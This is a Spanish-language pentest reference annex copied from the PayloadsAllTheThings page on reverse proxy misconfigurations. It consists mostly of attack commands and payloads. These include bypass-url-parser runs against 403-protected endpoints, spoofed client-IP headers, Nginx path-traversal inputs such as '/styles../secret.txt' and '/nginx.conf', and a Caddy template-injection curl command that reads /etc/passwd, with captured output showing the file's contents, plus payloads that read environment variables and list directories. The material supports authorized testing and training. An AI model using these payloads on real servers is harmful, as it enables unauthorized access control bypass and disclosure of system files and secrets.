# Configuración de seguridad incorrecta: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Reverse Proxy Misconfigurations/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Reverse%20Proxy%20Misconfigurations/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Reverse Proxy Misconfigurations / Herramientas

```ps1
    bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d
    bypass-url-parser -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test"
    bypass-url-parser -R /path/request_file --request-tls -m "mid_paths, end_paths"
```

## 2. Metodología / HTTP Cabeceras

### Variantes presentes en tablas o texto del apartado

```text
X-Forwarded-For
X-Real-IP
True-Client-IP
```

## 3. HTTP Cabeceras / X-Forwarded-For

```ps1
X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3
```

```ps1
proxy_set_header X-Forwarded-For $remote_addr;
```

### Variantes presentes en tablas o texto del apartado

```text
X-Forwarded-For
```

## 4. HTTP Cabeceras / X-Real-IP

### Variantes presentes en tablas o texto del apartado

```text
X-Real-IP
```

## 5. HTTP Cabeceras / True-Client-IP

### Variantes presentes en tablas o texto del apartado

```text
True-Client-IP
```

## 6. Nginx / Off By Slash

```ps1
server {
  location /app/ {
    # Handles /app/ and anything below, e.g., /app/foo
  }
  location /app {
    # Handles only /app with nothing after OR routes like /application, /appzzz
  }
}
```

```ps1
location /styles {
  alias /path/css/;
}
```

### Variantes presentes en tablas o texto del apartado

```text
location /app/
/app/
/app/foo
/app/bar/123
location /app
/app*
/application
/appfile
/styles../secret.txt
/path/styles/../secret.txt
```

## 7. Nginx / Missing Root Location

```ps1
server {
  root /etc/nginx;

  location /hello.txt {
    try_files $uri $uri/ =404;
    proxy_pass http://127.0.0.1:8080/;
  }
}
```

### Variantes presentes en tablas o texto del apartado

```text
root /etc/nginx;
/
/nginx.conf
/etc/nginx/nginx.conf
```

## 8. Caddy / Template Inyección

```ps1
:80 {
    root * /
    templates
    respond "You came from {http.request.header.Referer}"
}
```

```ps1
curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/
```

```ps1
HTTP/1.1 200 OK
Content-Length: 716
Content-Type: text/plain; charset=utf-8
Server: Caddy
Date: Thu, 24 Jul 2025 08:00:50 GMT

You came from root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
```

### Variantes presentes en tablas o texto del apartado

```text
{{readFile "etc/passwd"}}
/etc/passwd
{{env "VAR_NAME"}}
{{listFiles "/"}}
{{readFile "path/to/file"}}
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
